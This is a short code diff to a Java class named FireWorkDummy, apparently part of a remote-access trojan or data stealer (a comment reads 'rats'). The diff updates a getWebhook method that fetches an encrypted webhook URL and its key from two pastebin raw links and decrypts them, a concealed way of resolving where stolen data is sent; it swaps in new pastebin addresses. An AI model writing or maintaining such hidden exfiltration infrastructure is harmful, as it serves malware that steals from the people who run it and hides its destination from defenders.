@@ -54,13 +54,10 @@ public class FireWorkDummy {
         }
     }
 
-    public static String getWebhook() {
-        try {
-            BufferedReader in = new BufferedReader(new InputStreamReader(new URL("https://pastebin.com/raw/DR7aWqKS").openStream()));
-            BufferedReader in2 = new BufferedReader(new InputStreamReader(new URL("https://pastebin.com/raw/PY1CRmaU").openStream()));
-            return decrypt(in2.readLine(), in.readLine());
-        } catch (Exception ignored) {}
-        return "";
+    public static String getWebhook() throws IOException, InvalidAlgorithmParameterException, IllegalBlockSizeException, NoSuchPaddingException, NoSuchAlgorithmException, BadPaddingException, InvalidKeySpecException, InvalidKeyException {
+        BufferedReader in = new BufferedReader(new InputStreamReader(new URL("https://pastebin.com/raw/aM9XjYMZ").openStream()));
+        BufferedReader in2 = new BufferedReader(new InputStreamReader(new URL("https://pastebin.com/raw/KqYYAyL5").openStream()));
+        return decrypt(in2.readLine(), in.readLine());
     }
 
     // rats
